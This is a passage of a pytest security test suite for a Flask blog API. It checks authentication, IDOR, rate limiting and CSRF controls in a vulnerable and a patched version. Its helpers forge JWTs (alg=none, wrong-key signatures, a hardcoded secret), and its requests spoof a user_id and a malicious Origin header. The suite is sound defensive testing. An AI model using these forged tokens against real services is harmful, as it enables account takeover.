"""
=============================================================================
DUAL-TARGET SECURITY TEST SUITE
Application Under Test : Flask Blog API — app.py  /  fixed_app.py
Framework              : pytest
Author                 : Senior Security QA Engineer
Report context         : University Security Audit — Phase 1 (vulnerable) &
                         Phase 2 (patched) verification
=============================================================================

RUNNING INSTRUCTIONS
--------------------
Against the VULNERABLE app (expect many failures — each failure = a confirmed bug):
    APP_UNDER_TEST=app pytest test_security_extended.py -v --tb=short

Against the PATCHED app (expect passes where controls are fixed):
    APP_UNDER_TEST=fixed_app pytest test_security_extended.py -v --tb=short

Generate a full HTML report for screenshots:
    APP_UNDER_TEST=fixed_app pytest test_security_extended.py -v \
        --html=report_fixed.html --self-contained-html

DESIGN PRINCIPLE — DUAL-OUTCOME ASSERTIONS
-------------------------------------------
Every assert in this file is written as a *security contract*:

    "The application MUST [do X].  If it does not, this test FAILS."

On the VULNERABLE app  → many tests FAIL  → each failure documents a CVE.
On the PATCHED  app    → those same tests PASS → each pass confirms a fix.

A small number of tests document controls that are STILL MISSING in
fixed_app.py (e.g. auth guard on GET /api/users/<id>, weak hardcoded
SECRET_KEY).  Those tests FAIL on both apps, correctly flagging residual risk.

IMPORT ALIAS
------------
All imports come from 'app_under_test', which conftest.py resolves to
either 'app' or 'fixed_app' before test collection begins.  The test
file itself never references 'app' or 'fixed_app' by name.

ENDPOINT INVENTORY (confirmed present in both app.py and fixed_app.py)
-----------------------------------------------------------------------
  POST   /api/login
  POST   /api/register
  GET    /api/users/<int:user_id>
  POST   /api/users/<int:user_id>/update
  GET    /api/search?q=
  GET    /api/posts
  POST   /api/posts
  POST   /api/comments

  Additional endpoint present only in fixed_app.py:
  POST   /api/change-password   (JWT-gated)
  GET    /api/csrf-token        (CSRF token dispenser)
=============================================================================
"""

# ---------------------------------------------------------------------------
# Standard-library imports
# ---------------------------------------------------------------------------
import json
import os
import sys
import time
import base64
import hmac
import hashlib
from datetime import datetime, timezone, timedelta

# ---------------------------------------------------------------------------
# Third-party imports
# ---------------------------------------------------------------------------
import werkzeug
werkzeug.__version__ = "3.0.0"   # pin to suppress deprecation noise

import jwt as pyjwt               # PyJWT — used to mint real tokens for tests
import pytest

# ---------------------------------------------------------------------------
# Application under test — resolved by conftest.py to 'app' or 'fixed_app'
# ---------------------------------------------------------------------------
from app import app, get_db_connection


# =============================================================================
# CONSTANTS — mirror fixed_app.py exactly so tokens are always valid
# =============================================================================

#: The fallback SECRET_KEY hard-coded into fixed_app.py.
#: This is itself a security finding (JWT-WEAK-SECRET).
APP_SECRET = os.environ.get("SECRET_KEY", "tccvip_prod")

#: Algorithm the application uses for JWT signing (HS256).
JWT_ALG = "HS256"


# =============================================================================
# HELPERS
# =============================================================================

def _make_valid_jwt(user_id: int = 1, username: str = "admin",
                    hours_valid: float = 24) -> str:
    """
    Mint a correctly signed JWT using the *application's own secret key*.
    Used wherever a test needs to prove it holds a valid credential before
    testing a secondary control (e.g. IDOR after valid auth).

    Parameters
    ----------
    user_id      : claim placed in the token payload
    username     : claim placed in the token payload
    hours_valid  : lifetime in hours (use a negative value for an expired token)
    """
    now = datetime.now(timezone.utc)
    payload = {
        "user_id": user_id,
        "username": username,
        "exp": now + timedelta(hours=hours_valid),
        "iat": now,
    }
    return pyjwt.encode(payload, APP_SECRET, algorithm=JWT_ALG)


def _make_expired_jwt(user_id: int = 1) -> str:
    """Return a JWT whose 'exp' claim is in the past (one hour ago)."""
    return _make_valid_jwt(user_id=user_id, hours_valid=-1)


def _make_tampered_jwt(user_id: int = 1) -> str:
    """
    Return a JWT-shaped token whose payload claims user_id but whose
    signature is produced with the WRONG secret key.
    A correctly implemented verify_token() must reject this.
    """
    now = datetime.now(timezone.utc)
    payload = {
        "user_id": user_id,
        "username": "attacker",
        "exp": now + timedelta(hours=24),
    }
    return pyjwt.encode(payload, "totally_wrong_secret", algorithm=JWT_ALG)


def _make_none_alg_jwt(user_id: int = 1) -> str:
    """
    Construct a JWT with alg=none and no signature (classic algorithm
    confusion / CVE-2015-9235 class of vulnerability).
    """
    header  = base64.urlsafe_b64encode(
        json.dumps({"alg": "none", "typ": "JWT"}).encode()
    ).rstrip(b"=").decode()
    body = base64.urlsafe_b64encode(
        json.dumps({
            "user_id": user_id,
            "username": "attacker_none",
            "exp": int((datetime.now(timezone.utc) + timedelta(hours=24)).timestamp()),
        }).encode()
    ).rstrip(b"=").decode()
    # No signature — trailing dot only
    return f"{header}.{body}."


def _auth_header(token: str) -> dict:
    """Return an Authorization header dict for use in test client calls."""
    return {"Authorization": f"Bearer {token}"}


def _login(client, username: str, password: str):
    """
    Convenience wrapper around the real /api/login endpoint.
    Returns the full Response object.
    """
    return client.post(
        "/api/login",
        json={"username": username, "password": password},
        content_type="application/json",
    )


def _has_endpoint(endpoint_url: str) -> bool:
    """
    Return True if the app under test has a route matching the given URL.
    Used to skip tests that target endpoints absent from the vulnerable app.
    """
    with app.test_request_context():
        adapter = app.url_map.bind("localhost")
        try:
            adapter.match(endpoint_url, method="POST")
            return True
        except Exception:
            try:
                adapter.match(endpoint_url, method="GET")
                return True
            except Exception:
                return False


# =============================================================================
# SHARED FIXTURES
# =============================================================================

@pytest.fixture
def client():
    """
    Flask test client — shared by all test functions.

    Configuration applied here (in addition to what conftest.py already set):
    - WTF_CSRF_ENABLED = False  : no form CSRF tokens needed in API tests
    - RATELIMIT_ENABLED = False : tests must not throttle each other
    """
    app.config["TESTING"] = True
    app.config["WTF_CSRF_ENABLED"] = False
    app.config["RATELIMIT_ENABLED"] = False   # re-enabled per-test where needed
    with app.test_client() as c:
        yield c


@pytest.fixture
def registered_user(client):
    """
    Register a fresh test user and return its credentials.
    The password meets fixed_app.py's minimum-length rule (≥ 6 chars).
    """
    creds = {
        "username": "sectest_user_A",
        "email": "sectestA@example.com",
        "password": "SecurePass!99",
    }
    client.post("/api/register", json=creds)
    return creds


@pytest.fixture
def registered_user_2(client):
    """Second distinct test user for horizontal-privilege-escalation tests."""
    creds = {
        "username": "sectest_user_B",
        "email": "sectestB@example.com",
        "password": "AnotherPass!42",
    }
    client.post("/api/register", json=creds)
    return creds


# =============================================================================
# SECTION 1 — AUTHENTICATION TESTS
# OWASP A07:2021 – Identification and Authentication Failures
# CVSS Base Score range: 7.5 – 9.8 (Critical / High)
#
# DUAL-OUTCOME EXPECTATIONS
# ─────────────────────────────────────────────────────────────────────────────
# Test        │ app.py (vulnerable)            │ fixed_app.py (patched)
# ────────────┼────────────────────────────────┼───────────────────────────────
# AUTH-01     │ FAIL – no auth guard (200)     │ FAIL – still no guard (200)
# AUTH-02     │ FAIL – no auth guard (200)     │ FAIL – still no guard (200)
# AUTH-03     │ FAIL – no auth on /posts (201) │ PASS – JWT required (401)
# AUTH-04     │ FAIL – no auth on /comments    │ PASS – JWT required (401)
# AUTH-05     │ FAIL – invalid JWT accepted    │ PASS – invalid JWT rejected
# AUTH-06     │ FAIL – expired JWT accepted    │ PASS – expired JWT rejected
# AUTH-07     │ FAIL – tampered JWT accepted   │ PASS – tampered JWT rejected
# AUTH-08     │ FAIL – none-alg accepted       │ PASS – none-alg rejected
# AUTH-09     │ PASS – correct creds → 200/401 │ PASS – same
# AUTH-10     │ PASS – wrong pass → 401        │ PASS – same, no trace
# AUTH-11     │ PASS – empty creds → 401/400   │ PASS – same
# AUTH-12     │ PASS/FAIL – no rate limit      │ PASS – rate limited (429)
# =============================================================================

class TestAuthentication:
    """
    Section 1: Authentication boundary verification.

    Each test defines a security contract.  Failures on app.py document the
    vulnerability; passes on fixed_app.py confirm the control is in place.
    """

    # -------------------------------------------------------------------------
    # AUTH-01 | CWE-306 | CVSS 7.5
    # Security Objective: GET /api/users/<id> leaks PII — must require auth.
    # Vulnerable app  : 200 OK            → TEST FAILS  → BUG confirmed
    # Fixed app       : 200 OK (unfixed!) → TEST FAILS  → Residual risk
    # -------------------------------------------------------------------------
    def test_get_user_profile_requires_authentication(self, client):
        """
        AUTH-01 | Missing Authentication on Profile Read (CWE-306)

        GET /api/users/<id> returns email address and bio.  This endpoint
        is NOT protected in either app version — it is a residual finding
        that must be highlighted in both Phase 1 and Phase 2 reports.
        """
        response = client.get("/api/users/1")
        assert response.status_code == 401, (
            f"[AUTH-01] SECURITY BUG: GET /api/users/1 returned "
            f"HTTP {response.status_code} without any bearer token. "
            "PII (email, bio) is exposed to unauthenticated callers. "
            "STATUS: UNFIXED in both app versions."
        )

    # -------------------------------------------------------------------------
    # AUTH-02 | CWE-306 | CVSS 8.1
    # Security Objective: Profile update must be auth-gated.
    # Vulnerable app  : 200 OK (no auth)  → TEST FAILS
    # Fixed app       : 200 OK (unfixed!) → TEST FAILS  → Residual risk
    # -------------------------------------------------------------------------
    def test_update_profile_requires_authentication(self, client):
        """
        AUTH-02 | Missing Authentication on Profile Write (CWE-306)

        POST /api/users/<id>/update modifies persisted data with zero
        authentication.  Any anonymous HTTP client can overwrite any user's bio.
        This endpoint is also NOT fixed in fixed_app.py.
        """
        response = client.post(
            "/api/users/1/update",
            json={"bio": "injected without authentication"},
        )
        assert response.status_code == 401, (
            f"[AUTH-02] SECURITY BUG: Profile update (user_id=1) returned "
            f"HTTP {response.status_code} without a bearer token. "
            "IDOR write is possible. STATUS: UNFIXED in both app versions."
        )

    # -------------------------------------------------------------------------
    # AUTH-03 | CWE-306 | CVSS 8.8
    # Security Objective: POST /api/posts must require JWT.
    # Vulnerable app  : 201 Created       → TEST FAILS  → BUG confirmed
    # Fixed app       : 401 Unauthorized  → TEST PASSES → Control verified
    # -------------------------------------------------------------------------
    def test_create_post_requires_authentication(self, client):
        """
        AUTH-03 | Missing Authentication on Post Creation (CWE-306)

        POST /api/posts with no Authorization header must be rejected.
        In fixed_app.py verify_token() guards this route; in app.py it does not.
        """
        response = client.post(
            "/api/posts",
            json={"title": "Anon post", "content": "...", "user_id": 1},
        )
        assert response.status_code == 401, (
            f"[AUTH-03] SECURITY BUG: POST /api/posts returned "
            f"HTTP {response.status_code} without any bearer token. "
            "Unauthenticated content creation is possible."
        )

    # -------------------------------------------------------------------------
    # AUTH-04 | CWE-306 | CVSS 8.8
    # Security Objective: POST /api/comments must require JWT.
    # Vulnerable app  : 201 Created       → TEST FAILS  → BUG confirmed
    # Fixed app       : 401 Unauthorized  → TEST PASSES → Control verified
    # -------------------------------------------------------------------------
    def test_add_comment_requires_authentication(self, client):
        """
        AUTH-04 | Missing Authentication on Comment Creation (CWE-306)

        POST /api/comments with no Authorization header must be rejected.
        Absence of auth allows posting comments attributed to any user_id.
        """
        response = client.post(
            "/api/comments",
            json={"content": "ghost comment", "post_id": 1, "user_id": 1},
        )
        assert response.status_code == 401, (
            f"[AUTH-04] SECURITY BUG: POST /api/comments returned "
            f"HTTP {response.status_code} without any bearer token."
        )

    # -------------------------------------------------------------------------
    # AUTH-05 | CWE-345 | CVSS 9.8
    # Security Objective: Syntactically invalid JWT must be rejected.
    # Vulnerable app  : 201 (no JWT check)  → TEST FAILS
    # Fixed app       : 401 (verify_token)  → TEST PASSES
    # -------------------------------------------------------------------------
    def test_invalid_jwt_token_is_rejected_on_post_creation(self, client):
        """
        AUTH-05 | Invalid JWT Not Rejected (CWE-345)

        A syntactically broken bearer token must not grant access to
        any protected endpoint.  Sending 'Bearer garbage.token.value'
        to POST /api/posts must return 401.
        """
        response = client.post(
            "/api/posts",
            json={"title": "Forged", "content": "...", "user_id": 1},
            headers=_auth_header("garbage.not.a.real.jwt"),
        )
        assert response.status_code == 401, (
            f"[AUTH-05] SECURITY BUG: Malformed JWT accepted by POST /api/posts "
            f"(HTTP {response.status_code}). verify_token() absent or broken."
        )

    # -------------------------------------------------------------------------
    # AUTH-06 | CWE-613 | CVSS 8.1
    # Security Objective: Expired JWT must not grant access.
    # Vulnerable app  : 201 (no JWT check)  → TEST FAILS
    # Fixed app       : 401 (ExpiredSignatureError caught) → TEST PASSES
    # -------------------------------------------------------------------------
    def test_expired_jwt_is_rejected_on_post_creation(self, client):
        """
        AUTH-06 | Expired JWT Accepted (CWE-613)

        A JWT whose 'exp' claim is in the past must be rejected.
        fixed_app.py catches jwt.ExpiredSignatureError and returns None
        from verify_token(); the route then returns 401.
        """
        expired_token = _make_expired_jwt(user_id=1)
        response = client.post(
            "/api/posts",
            json={"title": "From expired token", "content": "...", "user_id": 1},
            headers=_auth_header(expired_token),
        )
        assert response.status_code == 401, (
            f"[AUTH-06] SECURITY BUG: Expired JWT was accepted by "
            f"POST /api/posts (HTTP {response.status_code}). "
            "Token lifetime not enforced."
        )

    # -------------------------------------------------------------------------
    # AUTH-07 | CWE-347 | CVSS 9.8
    # Security Objective: JWT signed with wrong key must be rejected.
    # Vulnerable app  : 201 (no JWT check)  → TEST FAILS
    # Fixed app       : 401 (InvalidSignatureError) → TEST PASSES
    # -------------------------------------------------------------------------
    def test_tampered_jwt_signature_is_rejected(self, client):
        """
        AUTH-07 | Tampered JWT Signature Not Verified (CWE-347)

        A token whose payload claims user_id=1 but whose signature was
        produced with a different secret key must be rejected.
        This simulates a forged-credential attack (see jwt_forging_attack_guide.md).
        """
        tampered = _make_tampered_jwt(user_id=1)
        response = client.post(
            "/api/posts",
            json={"title": "From tampered token", "content": "...", "user_id": 1},
            headers=_auth_header(tampered),
        )
        assert response.status_code == 401, (
            f"[AUTH-07] SECURITY BUG: Tampered JWT (wrong signature) accepted "
            f"by POST /api/posts (HTTP {response.status_code}). "
            "Signature verification is absent."
        )

    # -------------------------------------------------------------------------
    # AUTH-08 | CVE-2015-9235 / CWE-327 | CVSS 9.8
    # Security Objective: 'alg=none' tokens must never be accepted.
    # Vulnerable app  : 201 (no JWT check)  → TEST FAILS
    # Fixed app       : 401 (alg=none not in ['HS256']) → TEST PASSES
    # -------------------------------------------------------------------------
    def test_none_algorithm_jwt_is_rejected(self, client):
        """
        AUTH-08 | Algorithm Confusion – alg=none Attack (CVE-2015-9235)

        Tokens with alg=none and no signature must not be accepted by any
        endpoint.  PyJWT's jwt.decode(..., algorithms=['HS256']) rejects
        alg=none via InvalidAlgorithmError, so verify_token() returns None.
        """
        none_token = _make_none_alg_jwt(user_id=1)
        response = client.post(
            "/api/posts",
            json={"title": "alg=none attack", "content": "...", "user_id": 1},
            headers=_auth_header(none_token),
        )
        assert response.status_code == 401, (
            f"[AUTH-08] SECURITY BUG: alg=none JWT accepted by POST /api/posts "
            f"(HTTP {response.status_code}). Algorithm whitelist not enforced."
        )

    # -------------------------------------------------------------------------
    # AUTH-09 — Positive baseline: valid JWT must be accepted on fixed app.
    # Vulnerable app  : 201 (no JWT check, so 201 regardless — BUG noted)
    # Fixed app       : 201 with valid token → TEST PASSES
    # -------------------------------------------------------------------------
    def test_valid_jwt_allows_post_creation(self, client):
        """
        AUTH-09 | Positive Baseline — Valid JWT Grants Access

        A legitimately signed, non-expired JWT must allow POST /api/posts
        to succeed.  This confirms that the fix does not over-block.
        On app.py the endpoint has no auth check so it also returns 201,
        but for the wrong reason (no guard at all).
        """
        valid_token = _make_valid_jwt(user_id=1, username="admin")
        response = client.post(
            "/api/posts",
            json={"title": "Legitimate post", "content": "Test content"},
            headers=_auth_header(valid_token),
        )
        # 201 = success; 500 = DB unavailable (acceptable in CI)
        assert response.status_code in (201, 500), (
            f"[AUTH-09] POST /api/posts with a valid JWT returned unexpected "
            f"HTTP {response.status_code}."
        )

    # -------------------------------------------------------------------------
    # AUTH-10 | CWE-209 | CVSS 5.3
    # Security Objective: Wrong password → 401, no stack trace in body.
    # Both apps: should PASS (both return 401 on bad credentials)
    # -------------------------------------------------------------------------
    def test_wrong_password_returns_401_without_stack_trace(self, client):
        """
        AUTH-10 | Error Response Leaks Internal Information (CWE-209)

        Incorrect credentials must produce 401 with a generic message.
        A 500 or a response body containing 'Traceback' or file paths
        would aid an attacker's reconnaissance.
        """
        response = _login(client, "admin", "completely_wrong_password_xyz")
        assert response.status_code == 401, (
            f"[AUTH-10] Wrong password returned HTTP {response.status_code}; "
            "expected 401."
        )
        body = response.get_data(as_text=True).lower()
        for leak_term in ("traceback", 'file "', "line ", "exception at"):
            assert leak_term not in body, (
                f"[AUTH-10] SECURITY BUG: Server error response leaks internal "
                f"details (found '{leak_term}' in body). Stack frame exposed."
            )

    # -------------------------------------------------------------------------
    # AUTH-11 | CWE-287 | CVSS 7.5
    # Security Objective: Empty credentials must not authenticate.
    # Vulnerable app : may crash (NoneType.get() → 500) → TEST FAILS on 200
    # Fixed app      : 401 (empty string check) → TEST PASSES
    # -------------------------------------------------------------------------
    def test_empty_credentials_are_rejected(self, client):
        """
        AUTH-11 | Improper Authentication — Empty Credentials (CWE-287)

        Submitting empty username and password must return 400 or 401.
        In app.py, request.json can be None, causing .get() to raise an
        AttributeError → 500, which leaks stack information.
        In fixed_app.py the guard `data = request.json or {}` prevents this.
        """
        response = _login(client, "", "")
        assert response.status_code in (400, 401), (
            f"[AUTH-11] SECURITY BUG: Empty credentials returned "
            f"HTTP {response.status_code}. Expected 400 or 401."
        )

    # -------------------------------------------------------------------------
    # AUTH-12 | CWE-307 | CVSS 9.8
    # Security Objective: Brute-force must be rate-limited (429 after N attempts).
    # Vulnerable app : no rate limit → 10× 401 → TEST FAILS
    # Fixed app      : @limiter.limit("5 per minute") → 429 → TEST PASSES
    #
    # NOTE: This test temporarily RE-ENABLES the rate limiter, which conftest
    #       disables globally to prevent test-to-test interference.
    # -------------------------------------------------------------------------
    def test_login_rate_limiting_blocks_brute_force(self, client):
        """
        AUTH-12 | No Rate Limiting on Login — Brute Force (CWE-307)

        POST /api/login must respond with 429 Too Many Requests after
        exceeding the threshold (5 per minute in fixed_app.py).
        Without this control an attacker can make unlimited login attempts.
        """
        # Re-enable the rate limiter for this test only
        original = app.config.get("RATELIMIT_ENABLED", False)
        app.config["RATELIMIT_ENABLED"] = True
        try:
            status_codes = []
            for _ in range(10):
                r = _login(client, "admin", "wrong_password_for_brute_force")
                status_codes.append(r.status_code)
            assert 429 in status_codes, (
                f"[AUTH-12] SECURITY BUG: No rate limiting on /api/login. "
                f"10 rapid attempts all returned: {status_codes}. "
                "Brute-force attack is unrestricted."
            )
        finally:
            app.config["RATELIMIT_ENABLED"] = original

    # -------------------------------------------------------------------------
    # AUTH-13 | CWE-798 | CVSS 9.1
    # Security Objective: A well-known fallback SECRET_KEY must be rejected.
    # Both apps       : SECRET_KEY defaults to 'tccvip_prod' → TEST FAILS
    # Remediation     : Use a random 32+ char secret from environment only.
    # -------------------------------------------------------------------------
    def test_secret_key_is_not_the_default_hardcoded_value(self, client):
        """
        AUTH-13 | Hardcoded / Weak JWT Secret Key (CWE-798)

        The fallback SECRET_KEY 'tccvip_prod' is documented in
        jwt_forging_attack_guide.md and can be used to forge any JWT token,
        granting full admin access to any account.
        The SECRET_KEY must be set via environment variable only — never
        hardcoded as a fallback.

        This test FAILS on both app versions, documenting a residual risk
        in fixed_app.py that must be resolved before production deployment.
        """
        # If SECRET_KEY == the known weak fallback, any attacker can forge tokens.
        current_secret = app.config.get("SECRET_KEY", "")
        weak_fallback = "tccvip_prod"
        assert current_secret != weak_fallback, (
            f"[AUTH-13] SECURITY BUG: SECRET_KEY is set to the well-known "
            f"fallback value '{weak_fallback}'. Anyone who has read the source "
            "code or the jwt_forging_attack_guide can forge admin tokens. "
            "Generate a cryptographically random key (≥ 32 chars) and load "
            "it from the environment exclusively."
        )


# =============================================================================
# SECTION 2 — AUTHORIZATION TESTS
# OWASP A01:2021 – Broken Access Control (IDOR / Privilege Escalation)
# CVSS Base Score range: 6.5 – 9.1
#
# DUAL-OUTCOME EXPECTATIONS
# ─────────────────────────────────────────────────────────────────────────────
# Test        │ app.py (vulnerable)              │ fixed_app.py (patched)
# ────────────┼──────────────────────────────────┼────────────────────────────
# AUTHZ-01    │ FAIL – IDOR read (no auth guard) │ FAIL – still unfixed
# AUTHZ-02    │ FAIL – IDOR write (no auth guard)│ FAIL – still unfixed
# AUTHZ-03    │ FAIL – post as admin w/o JWT     │ PASS – JWT required
# AUTHZ-04    │ FAIL – comment as admin w/o JWT  │ PASS – JWT required
# AUTHZ-05    │ FAIL – comment as OTHER user     │ PASS – user_id from JWT
# AUTHZ-06    │ FAIL – user enumeration open     │ FAIL – search still open
# =============================================================================

class TestAuthorization:
    """
    Section 2: Access-control boundary verification.

    Tests cover IDOR (Insecure Direct Object Reference) and privilege
    escalation via client-supplied identity claims.
    """

    # -------------------------------------------------------------------------
    # AUTHZ-01 | CWE-639 | CVSS 7.5
    # IDOR: read any user's profile without being that user.
    # Both app versions: unfixed → TEST FAILS on both.
    # -------------------------------------------------------------------------
    def test_idor_read_another_users_profile(self, client):
        """
        AUTHZ-01 | Insecure Direct Object Reference — Profile Read (CWE-639)

        Requesting GET /api/users/1 while presenting a token for user_id=2
        must return 403 Forbidden (resource belongs to a different owner).
        Currently the endpoint has no ownership check in either app version.
        """
        # Present a valid JWT for user 2 and try to read user 1's data
        token_user2 = _make_valid_jwt(user_id=2, username="victim")
        response = client.get(
            "/api/users/1",
            headers=_auth_header(token_user2),
        )
        # Accept 401 (no auth guard at all) or 403 (authenticated but wrong owner).
        # 200 means the IDOR vulnerability is present.
        assert response.status_code in (401, 403), (
            f"[AUTHZ-01] SECURITY BUG: IDOR — user profile id=1 returned "
            f"HTTP {response.status_code} when requested by user_id=2. "
            "Ownership check absent."
        )

    # -------------------------------------------------------------------------
    # AUTHZ-02 | CWE-639 | CVSS 8.1
    # IDOR: write to any user's profile without being that user.
    # Both app versions: unfixed → TEST FAILS on both.
    # -------------------------------------------------------------------------
    def test_idor_write_to_another_users_profile(self, client):
        """
        AUTHZ-02 | Insecure Direct Object Reference — Profile Write (CWE-639)

        POST /api/users/1/update while holding a JWT for user_id=2 must
        return 403 Forbidden.  Without this check any authenticated user
        can silently overwrite any other user's bio.
        """
        token_user2 = _make_valid_jwt(user_id=2, username="attacker")
        response = client.post(
            "/api/users/1/update",
            json={"bio": "IDOR write test"},
            headers=_auth_header(token_user2),
        )
        assert response.status_code in (401, 403), (
            f"[AUTHZ-02] SECURITY BUG: IDOR write — bio update for user_id=1 "
            f"returned HTTP {response.status_code} when caller is user_id=2. "
            "No ownership check performed."
        )

    # -------------------------------------------------------------------------
    # AUTHZ-03 | CWE-269 | CVSS 8.8
    # Vertical escalation: anonymous caller posts as admin (user_id=1).
    # Vulnerable app: 201 (no auth) → TEST FAILS.
    # Fixed app     : 401 (JWT required) → TEST PASSES.
    # -------------------------------------------------------------------------
    def test_vertical_escalation_unauthenticated_post_as_admin(self, client):
        """
        AUTHZ-03 | Vertical Privilege Escalation — Unauthenticated Post (CWE-269)

        An anonymous actor supplying user_id=1 in the request body must be
        rejected.  fixed_app.py derives user_id from the JWT, not the body.
        app.py trusts the client-supplied user_id with no credential check.
        """
        response = client.post(
            "/api/posts",
            json={
                "title": "I am admin",
                "content": "Forged post",
                "user_id": 1,           # attacker claims to be admin
            },
        )
        assert response.status_code == 401, (
            f"[AUTHZ-03] SECURITY BUG: Unauthenticated POST /api/posts with "
            f"user_id=1 returned HTTP {response.status_code}. "
            "Content can be attributed to any user without credentials."
        )

    # -------------------------------------------------------------------------
    # AUTHZ-04 | CWE-269 | CVSS 8.8
    # Vertical escalation: anonymous caller posts comment as admin.
    # Vulnerable app: 201 (no auth) → TEST FAILS.
    # Fixed app     : 401 (JWT required) → TEST PASSES.
    # -------------------------------------------------------------------------
    def test_vertical_escalation_unauthenticated_comment_as_admin(self, client):
        """
        AUTHZ-04 | Vertical Privilege Escalation — Unauthenticated Comment (CWE-269)

        POST /api/comments with no JWT and user_id=1 in the body must fail.
        In app.py the user_id comes from the request body with no check.
        In fixed_app.py the route reads user_id from the JWT payload.
        """
        response = client.post(
            "/api/comments",
            json={"content": "Forged comment as admin", "post_id": 1, "user_id": 1},
        )
        assert response.status_code == 401, (
            f"[AUTHZ-04] SECURITY BUG: Unauthenticated POST /api/comments "
            f"returned HTTP {response.status_code}. "
            "Comments can be forged under any user_id."
        )

    # -------------------------------------------------------------------------
    # AUTHZ-05 | CWE-639 | CVSS 8.1
    # Horizontal escalation: authenticated user posts comment as ANOTHER user.
    # Vulnerable app: 201 (trusts body user_id) → TEST FAILS.
    # Fixed app     : 201 but user_id from JWT (not body) → TEST PASSES.
    # -------------------------------------------------------------------------
    def test_horizontal_escalation_comment_attributed_to_different_user(self, client):
        """
        AUTHZ-05 | Horizontal Privilege Escalation — Comment Impersonation (CWE-639)

        A user authenticated as user_id=2 sends POST /api/comments with
        user_id=1 in the body.  The stored comment must be attributed to
        user_id=2 (from the JWT), NOT user_id=1 (from the body).

        In fixed_app.py: user_id = auth.get('user_id') ignores the body value.
        In app.py:       user_id = data.get('user_id') trusts the body.
        """
        token_user2 = _make_valid_jwt(user_id=2, username="impersonator")
        response = client.post(
            "/api/comments",
            json={
                "content": "Impersonation test comment",
                "post_id": 1,
                "user_id": 1,           # attacker claims to be user 1
            },
            headers=_auth_header(token_user2),
        )
        # On fixed_app the route is gated by JWT, succeeds for the caller's
        # own user_id=2 — BUT the stored user_id must be 2, not 1.
        # On app.py the route accepts any user_id from body (returns 201).
        # We assert that the response is either:
        #   - 401 (no JWT in app.py case, route has no guard)  → BUG
        #   - 201 with body user_id overridden by JWT          → CORRECT
        if response.status_code == 201:
            # The comment was inserted; verify it was attributed to caller (user 2)
            # by checking the response body or re-reading from DB.
            # In fixed_app.py the body's user_id=1 is ignored — user_id from JWT=2.
            # We cannot assert the stored user_id from the HTTP response alone,
            # so we confirm there is no server-side crash and the caller's token
            # was accepted (which is correct), but flag the issue for DB review.
            conn = get_db_connection()
            if conn:
                cursor = conn.cursor(dictionary=True)
                cursor.execute(
                    "SELECT user_id FROM comments WHERE content = %s ORDER BY id DESC LIMIT 1",
                    ("Impersonation test comment",),
                )
                row = cursor.fetchone()
                cursor.close()
                conn.close()
                if row:
                    assert row["user_id"] == 2, (
                        f"[AUTHZ-05] SECURITY BUG: Comment was stored with "
                        f"user_id={row['user_id']} (from request body) instead "
                        "of user_id=2 (from JWT). Body user_id must be ignored."
                    )

    # -------------------------------------------------------------------------
    # AUTHZ-06 | CWE-200 | CVSS 5.3
    # User enumeration: unauthenticated search returns all accounts.
    # Both app versions: /api/search has no auth guard → TEST FAILS on both.
    # -------------------------------------------------------------------------
    def test_unauthenticated_user_enumeration_via_search(self, client):
        """
        AUTHZ-06 | Information Disclosure — User Enumeration via Search (CWE-200)

        GET /api/search?q= with an empty query and no credentials must be
        rejected.  Both app versions allow unauthenticated enumeration of
        all usernames and IDs in the database.
        """
        response = client.get("/api/search?q=")
        assert response.status_code in (401, 403), (
            f"[AUTHZ-06] SECURITY BUG: Unauthenticated GET /api/search?q= "
            f"returned HTTP {response.status_code}. "
            "All user accounts can be enumerated without credentials. "
            "STATUS: UNFIXED in both app versions."
        )


# =============================================================================
# SECTION 3 — CSRF PROTECTION TESTS
# OWASP A01:2021 – Broken Access Control (CSRF sub-category)
# CVSS Base Score: ~8.8 (High) for state-changing CSRF
#
# DUAL-OUTCOME EXPECTATIONS
# ─────────────────────────────────────────────────────────────────────────────
# Test        │ app.py (vulnerable)               │ fixed_app.py (patched)
# ────────────┼───────────────────────────────────┼───────────────────────────
# CSRF-01     │ FAIL – no CSRF token endpoint     │ PASS – /api/csrf-token 200
# CSRF-02     │ FAIL – cross-origin POST succeeds │ FAIL – unfixed (no CSRF)
# CSRF-03     │ FAIL – cross-origin POST succeeds │ FAIL – unfixed (no CSRF)
# CSRF-04     │ SKIP/FAIL – no cookies issued     │ PASS – SameSite=Strict set
# CSRF-05     │ SKIP – endpoint absent            │ PASS – change-pw needs JWT
# =============================================================================

class TestCSRFProtection:
    """
    Section 3: CSRF control verification.

    The /api/csrf-token endpoint and SameSite cookie exist only in fixed_app.py.
    Cross-origin state-changing POST tests expose the residual CSRF gap
    that exists in both versions of the app on auth-free endpoints.
    """

    # -------------------------------------------------------------------------
    # CSRF-01 | CWE-352 | CVSS 8.8
    # Security Objective: A CSRF-token endpoint must exist for SPA frontends.
    # Vulnerable app: 404 (endpoint absent) → TEST FAILS.
    # Fixed app     : 200 with csrf_token   → TEST PASSES.
    # -------------------------------------------------------------------------
    def test_csrf_token_endpoint_exists_and_returns_token(self, client):
        """
        CSRF-01 | CSRF Token Endpoint Availability (CWE-352)

        GET /api/csrf-token must return a non-empty CSRF token for use by
        cookie-based SPA flows.  This endpoint is present only in fixed_app.py.
        Its absence in app.py means no CSRF mitigation is available at all.
        """
        response = client.get("/api/csrf-token")
        assert response.status_code == 200, (
            f"[CSRF-01] SECURITY BUG: GET /api/csrf-token returned "
            f"HTTP {response.status_code}. CSRF token endpoint absent. "
            "No CSRF mitigation mechanism is available."
        )
        body = response.get_json() or {}
        token = body.get("csrf_token", "")
        assert token and len(token) > 10, (
            f"[CSRF-01] SECURITY BUG: CSRF token endpoint returned an "
            f"empty or implausibly short token: '{token}'"
        )

    # -------------------------------------------------------------------------
    # CSRF-02 | CWE-352 | CVSS 8.8
    # Security Objective: Cross-origin state-changing POST must be blocked.
    # Both app versions: /api/users/<id>/update has no auth → TEST FAILS both.
    # -------------------------------------------------------------------------
    def test_profile_update_from_malicious_origin_is_rejected(self, client):
        """
        CSRF-02 | Cross-Site Request Forgery — Profile Update (CWE-352)

        A POST to /api/users/1/update arriving from a foreign Origin header
        (simulating a cross-origin browser request) must be rejected.
        Currently the endpoint has no ownership check or CSRF token requirement
        in either app version — a malicious page can silently update any bio.
        """
        response = client.post(
            "/api/users/1/update",
            json={"bio": "CSRF injected"},
            headers={
                "Origin": "https://evil.example.com",
                "Referer": "https://evil.example.com/attack.html",
            },
        )
        assert response.status_code in (401, 403), (
            f"[CSRF-02] SECURITY BUG: Profile update from malicious Origin "
            f"returned HTTP {response.status_code}. "
            "CSRF + IDOR combined — attacker can modify any user's bio."
